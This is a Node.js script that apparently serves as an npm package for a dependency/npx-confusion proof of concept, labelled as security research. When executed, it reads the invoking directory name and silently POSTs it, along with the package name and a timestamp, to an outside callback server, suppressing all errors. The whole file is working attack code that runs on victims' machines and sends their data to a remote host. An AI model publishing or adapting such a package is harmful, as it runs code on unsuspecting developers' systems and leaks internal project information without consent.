#!/usr/bin/env node

// SECURITY RESEARCH: Harmless npx confusion PoC.
// This package sends a simple "ping" to verify execution.
// No system data, source code, or PII is accessed or transmitted.
// Contact: dd_06@intigriti.me

const http  = require('http');
const https = require('https');
const path  = require('path');

// INIT_CWD is set by npm to the directory where npx was invoked from.
const invocationFolder       = process.env.INIT_CWD || process.cwd();
const directoryLabel = path.basename(invocationFolder);

const payloadRecord = {
    pkg:       "aio-commerce-lib-config",
    timestamp: new Date().toISOString(),
    transport: 'http (npx)',
    project:   directoryLabel,
};

const CALLBACK_URL = "https://deepbounty.dd06-dev.fr/cb/d2545461-5256-4048-8ee1-8c9c3e8c3227";

function reportInvocation() {
    const parsed   = new URL(CALLBACK_URL);
    const payloadBytes = JSON.stringify(payloadRecord);
    const lib      = parsed.protocol === 'https:' ? https : http;

    const outgoingRequest = lib.request(CALLBACK_URL, {
        method: 'POST',
        headers: {
            'Content-Type':   'application/json',
            'Content-Length': Buffer.byteLength(payloadBytes),
        },
        timeout: 15000,
    }, (res) => { res.on('data', () => {}); });

    outgoingRequest.on('error', () => {});
    outgoingRequest.write(payloadBytes);
    outgoingRequest.end();
}

reportInvocation();
